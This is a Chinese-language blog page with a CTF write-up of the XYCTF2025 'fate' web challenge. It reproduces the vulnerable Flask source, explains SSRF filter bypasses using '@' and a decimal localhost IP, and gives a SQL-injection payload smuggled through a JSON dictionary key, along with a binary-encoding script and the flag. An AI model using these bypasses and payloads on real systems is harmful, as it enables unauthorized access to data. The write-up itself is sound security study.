<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="由于比赛的时候刚好遇到值班，所以随便打了打。。 fate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!&#x2F;usr&#x2F;bin&#x2F;env py">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2025 Web wp">
<meta property="og:url" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/index.html">
<meta property="og:site_name" content="Meteor_Kai">
<meta property="og:description" content="由于比赛的时候刚好遇到值班，所以随便打了打。。 fate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!&#x2F;usr&#x2F;bin&#x2F;env py">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404165258705.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404171331082.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404171503774.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404184315979.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404184328397.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250405194643424.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250405205925943.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/bb9d6e26f451230f88ede6f3b6d5c5cd.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/2b85d95a20e4e094164d3f3ef8e422ce.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250405214748054.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409125208662.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409130600540.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409142739311.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409143622617.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409144049671.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409150146227.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250408155014946.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250408155106925.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409121045215.png">
<meta property="og:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250409123505303.png">
<meta property="article:published_time" content="2025-04-09T07:06:23.000Z">
<meta property="article:modified_time" content="2025-04-09T07:17:47.418Z">
<meta property="article:author" content="Meteor_Kai">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/image-20250404165258705.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>XYCTF2025 Web wp</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About me</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&text=XYCTF2025 Web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&is_video=false&description=XYCTF2025 Web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XYCTF2025 Web wp&body=Check out this article: http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&name=XYCTF2025 Web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&t=XYCTF2025 Web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fate"><span class="toc-number">1.</span> <span class="toc-text">fate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">2.</span> <span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql-%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD"><span class="toc-number">3.</span> <span class="toc-text">ezsql(手动滑稽)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-you-see-me-1"><span class="toc-number">4.</span> <span class="toc-text">Now you see me 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-you-see-me-2"><span class="toc-number">5.</span> <span class="toc-text">Now you see me 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-puzzle"><span class="toc-number">6.</span> <span class="toc-text">ez_puzzle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF"><span class="toc-number">7.</span> <span class="toc-text">出题人已疯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF"><span class="toc-number">8.</span> <span class="toc-text">出题人又疯</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        XYCTF2025 Web wp
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Meteor_Kai</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-09T07:06:23.000Z" class="dt-published" itemprop="datePublished">2025-04-09</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>由于比赛的时候刚好遇到值班，所以随便打了打。。</p>
<h2 id="fate"><a href="#fate" class="headerlink" title="fate"></a>fate</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">conn.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE FATETABLE (</span></span><br><span class="line"><span class="string">  NAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">  FATE TEXT NOT NULL</span></span><br><span class="line"><span class="string">);&quot;&quot;&quot;</span>)</span><br><span class="line">Fate = [</span><br><span class="line">    (<span class="string">&#x27;JOHN&#x27;</span>, <span class="string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JANE&#x27;</span>, <span class="string">&#x27;1990-2025 Lost in a fire&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;SARAH&#x27;</span>, <span class="string">&#x27;1982-2017 Fired by a government official&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;DANIEL&#x27;</span>, <span class="string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LUKE&#x27;</span>, <span class="string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;KAREN&#x27;</span>, <span class="string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;BRIAN&#x27;</span>, <span class="string">&#x27;1966-2002 Drowned in a river&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;ANNA&#x27;</span>, <span class="string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JACOB&#x27;</span>, <span class="string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LAMENTXU&#x27;</span>, <span class="string">r&#x27;2024 Send you a flag flag&#123;FAKE&#125;&#x27;</span>)</span><br><span class="line">]</span><br><span class="line">conn.executemany(<span class="string">&quot;INSERT INTO FATETABLE VALUES (?, ?)&quot;</span>, Fate)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先看app.py，&#x2F;proxy路由处存在ssrf，用@和2130706433来绕过就可以，前面的ssrf还是比较简单的我认为，abcdefghi可以二次编码绕过，后面1的传参url编码绕过即可。最后我们需要关注的是json.loads</p>
<p>读取LAMENTXU即可都得到flag。但是，在app.py中限制了长度不能&gt;6，即不可能读取到LAMENTXU对应的值。</p>
<p>显然，在限制了长度&lt;6的情况下是不可能直接输入字符串进行SQL注入的。</p>
<p>然后我们发现了json.loads，且传参没有进行任何检查。我们可以利用列表、元组、字典等类型传入非字符串类型</p>
<p>最后直接将用户的输入拼接到sql语句里查询。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur.execute(f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;&#123;code&#125;&#x27;)))))))&quot;)</span><br></pre></td></tr></table></figure>

<p>这里可以使用python中格式化字符串的特性。即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br><span class="line">print(f&#x27;test &#123;a&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>可以看到输出<code>test [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]</code>。</p>
<p>因此我们可以构造恶意语句进行拼接从而进行sql注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&#123;&quot;&#x27;)))))))union select FATE from FATETABLE limit 9,1--+&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>转个二进制传参就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将字符串转换为二进制字符串（每个字符对应8位二进制表示）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        input_string: 要转换的字符串</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        由0和1组成的二进制字符串，每个字符对应8位</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    binary_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line">    <span class="keyword">return</span> binary_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line">original_string = <span class="string">&#x27;&#123;&quot;name&quot;:&#123;&quot;\&#x27;)))))))union select FATE from FATETABLE limit 9,1--+&quot;:&quot;1&quot;&#125;&#125;&#x27;</span></span><br><span class="line">binary_str = string_to_binary(original_string)  <span class="comment"># 转换为二进制字符串</span></span><br><span class="line">restored_string = binary_to_string(binary_str)  <span class="comment"># 再转换回原字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;原始字符串: <span class="subst">&#123;original_string&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;二进制表示: <span class="subst">&#123;binary_str&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;还原后的字符串: <span class="subst">&#123;restored_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250404165258705.png" class="" title="This is an example image">



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus!&#125;</span><br></pre></td></tr></table></figure>





